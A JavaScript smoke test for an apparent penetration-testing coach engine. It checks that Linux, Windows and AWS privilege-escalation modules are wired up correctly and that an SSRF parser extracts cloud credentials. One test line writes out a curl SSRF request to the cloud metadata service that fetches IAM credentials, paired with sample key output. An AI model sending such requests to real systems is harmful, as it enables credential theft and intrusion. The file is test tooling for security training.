/* Phase-6 modules: the five privesc radar gaps now have modules that resolve on the right access card,
 * and the SSRF parser's cloud credential drives a first-class cloud post-exploitation move. */
'use strict';
var path = require('path');
var R = path.join(__dirname, '..', '..');
function req(p) { return require(path.join(R, p)); }
req('assets/engine/facts.js'); req('assets/engine/phases.js'); req('assets/engine/pack.js');
req('assets/engine/profile.js'); req('assets/engine/command.js'); req('assets/engine/workspace.js');
var OBOL = globalThis.OBOL, PK = OBOL.pack;
var fs = require('fs'), pdir = path.join(R, 'data/packs'), bundle = {};
fs.readdirSync(pdir).filter(function (f) { return f.endsWith('.json'); }).forEach(function (f) { bundle[f.replace(/\.json$/, '')] = JSON.parse(fs.readFileSync(path.join(pdir, f), 'utf8')); });
var A = PK.loadPacks(Object.keys(bundle).map(function (k) { return bundle[k]; }));
OBOL.packs = { actions: function () { return A; }, packData: function () { return bundle; } };
var by = {}; A.forEach(function (m) { by[m.id] = m; });
req('data/tools-install.js'); req('data/study-fixtures.js'); req('assets/engine/study.js');
req('assets/engine/parsers/common.js');
['nmap', 'directory', 'creds', 'host', 'web', 'services', 'database', 'websource', 'findings', 'shape'].forEach(function (m) { req('assets/engine/parsers/' + m + '.js'); });
req('assets/engine/parsers/index.js');
req('data/decision-forks.js'); req('data/parser-signatures.js'); req('data/coverage-expected.js');
req('assets/engine/decisionmap.js');
var DM = OBOL.decisionMap;

var fail = 0;
function ok(c, m) { if (!c) { console.error('  FAIL:', m); fail++; } else { console.log('  ok  :', m); } }

// the five privesc modules exist and carry a fixture + a fork
['linux-kernel-exploit', 'linux-path-hijack', 'linux-ld-preload', 'windows-dll-hijack', 'windows-schtask-abuse', 'aws-credential-abuse'].forEach(function (id) {
  ok(by[id], id + ' exists as a move');
  ok(OBOL.STUDY_FIXTURES[id] && OBOL.STUDY_FIXTURES[id].how, id + ' has a gold-standard fixture');
  ok(OBOL.DECISION_FORKS[id], id + ' has a fork condition');
});

// they resolve onto the right post-foothold access card
function onCard(key) { var e = OBOL.study.evidence().filter(function (x) { return x.key === key; })[0]; return (e.moves || []).map(function (m) { return m.id; }); }
var sl = onCard('shell-linux'), sw = onCard('shell-windows');
['linux-kernel-exploit', 'linux-path-hijack', 'linux-ld-preload'].forEach(function (id) { ok(sl.indexOf(id) >= 0, id + ' resolves on the shell-linux card'); });
['windows-dll-hijack', 'windows-schtask-abuse'].forEach(function (id) { ok(sw.indexOf(id) >= 0, id + ' resolves on the shell-windows card'); });

// the cloud path: the SSRF parser mints a cloud.credential, and aws-credential-abuse consumes it
var r = OBOL.parsers.parseActionOutput({ actionId: 'ssrf', command: "curl -s 'http://10.10.10.10/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role'", stdout: '{"AccessKeyId":"ASIAEXAMPLE123456789","SecretAccessKey":"wJalrXUtnFEMI","Token":"IQoJb3JpZ2lu"}', scope: 'host:10.10.10.10' });
var kinds = (r.facts || []).map(function (f) { return f.kind; });
ok(kinds.indexOf('cloud.credential') >= 0, 'SSRF to IMDS mints cloud.credential (the new typed lead)');
ok(kinds.indexOf('credential.candidate') >= 0, 'SSRF to IMDS still mints credential.candidate (unchanged capability)');
ok(kinds.indexOf('cloud.aws_access') < 0, 'SSRF does NOT mint cloud.aws_access (corpus proof discipline respected)');
ok([].concat(by['aws-credential-abuse'].requires_all || [], by['aws-credential-abuse'].requires_any || []).indexOf('cloud.credential') >= 0, 'aws-credential-abuse requires cloud.credential (so it is reachable after the SSRF)');

// coach integration: every new module is a ranked coach action whose commands are runnable (filled
// from facts/params) with the remaining blanks as {{tokens}} the coach turns into inputs, never raw
// <angle-bracket> hand-edit placeholders.
['linux-kernel-exploit', 'linux-path-hijack', 'linux-ld-preload', 'windows-dll-hijack', 'windows-schtask-abuse', 'aws-credential-abuse', 'mssql-linked-server', 'mysql-outfile-rce'].forEach(function (id) {
  var cmds = (by[id].commands || []).map(function (c) { return c.run || ''; }).join(' ');
  ok(cmds.length > 0, id + ' carries coach commands');
  ok(!/<[a-z][a-z .]+>/.test(cmds), id + ' commands have no raw <angle-bracket> placeholders (use {{tokens}})');
});
// the coach actually ranks a new move and hands its command when the trigger fact is present
var ranked = PK.nextActionsV2(new OBOL.facts.FactSet(['target.configured', 'host.up', 'cloud.credential'].map(function (k, i) { return OBOL.facts.makeFact({ kind: k, scope: { target: '10.10.10.10' }, source: 't', created_at: 1700000000000 + i }); })), A, {}) || [];
var cloud = ranked.filter(function (x) { return x.id === 'aws-credential-abuse'; })[0];
ok(cloud && (cloud.commands || []).length >= 2, 'Next Steps ranks aws-credential-abuse and hands its commands when cloud.credential is present');

// the gap report is clean: the radar is cleared and nothing regressed
var gr = DM.gapReport();
ok(gr.counts.coverageGap === 0, 'the privesc radar is cleared: 0 coverage gaps (' + gr.counts.coverageGap + ')');
ok(gr.counts.parseGap === 0 && gr.counts.unreachable === 0, 'still 0 parse gaps and 0 unreachable moves');

console.log('\nPRIVESC + CLOUD SMOKE: ' + (fail ? fail + ' FAILURE(S)' : 'all passed'));
process.exit(fail ? 1 : 0);
